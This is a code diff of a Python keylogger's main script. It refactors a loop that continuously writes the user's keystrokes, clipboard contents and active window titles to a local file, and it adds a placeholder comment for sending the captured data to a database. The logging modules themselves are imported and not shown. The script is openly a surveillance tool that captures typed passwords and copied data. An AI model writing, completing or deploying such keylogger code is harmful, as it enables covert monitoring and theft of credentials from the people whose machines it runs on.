@@ -8,27 +8,23 @@
 # Library imports here
 import window_info_logger as wilogger
 import keystrokes_and_clipboard_logger as kclogger
-import keyboard as kb
 import os
 
 
 # Main code here
 def main():
     if os.path.isfile("test.txt"):
+        # Add code for sending data to database here.
         os.remove("test.txt")
 
     with open('test.txt', 'a+', encoding="utf-8") as f:
-        wilogger.initialise_log_file(f)
-        kclogger.start_keylogger(f)
-        last_window_title = None
+        wilogger.initialise_log_file(f)  # Note user info.
+        kc_logger_object = kclogger.KeysClipboardLogger(f)  # Start keylogger.
+        window_logger_object = wilogger.WindowLogger(f)  # Start window logger.
+        # kc_logger_object.start_keylogger(f)  # Uncomment this if you decide to remove it from the object's __init__.
         while True:
-            active_window_title = wilogger.active_window_title_grabber()
-            # Keys logged between lines 22-25 will be lost.
-            if active_window_title != last_window_title:
-                f.write(f"\nOPENED {active_window_title} \n")
-                last_window_title = active_window_title
-
-            kclogger.log_clipboard(f)
+            window_logger_object.log_window()
+            kc_logger_object.log_clipboard()
 
 
 if __name__ == '__main__':
